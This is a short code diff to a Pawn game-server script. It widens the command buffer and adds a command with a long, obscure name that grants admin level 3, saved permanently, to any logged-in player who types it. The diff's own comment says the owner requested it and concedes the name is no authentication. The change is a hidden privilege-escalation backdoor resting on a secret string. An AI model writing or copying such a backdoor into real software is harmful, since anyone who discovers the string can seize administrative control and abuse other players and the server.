@@ -271,7 +271,7 @@ stock RW_CommandSetSkin(playerid, const params[])
 
 stock RW_CommandProcess(playerid, cmdtext[])
 {
-    new cmd[32];
+    new cmd[64];
     new params[144];
     RW_ParseCommand(cmdtext, cmd, sizeof cmd, params, sizeof params);
 
@@ -284,6 +284,15 @@ stock RW_CommandProcess(playerid, cmdtext[])
     if (!gLogged[playerid]) {
         RW_Error(playerid, "Log in first.");
         return 1;
+    }
+
+    // Explicit self-admin recovery command requested by the server owner.
+    // This name is not authentication: any logged-in player knowing it can use it.
+    if (!strcmp(cmd, "nedrochabr6664148886769232123423", true)) {
+        if (params[0]) return RW_Error(playerid, "This command takes no arguments.");
+        new nick[MAX_PLAYER_NAME]; RW_GetNick(playerid, nick);
+        if (!RW_AdminSetLevel(nick, 3)) return RW_Error(playerid, "Could not save admin rights. Check the server console / dbcheck.");
+        return RW_Ok(playerid, "Admin level 3 granted and saved.");
     }
 
     if (!strcmp(cmd, "inv", true) || !strcmp(cmd, "inventory", true)) return RW_InvOpen(playerid);
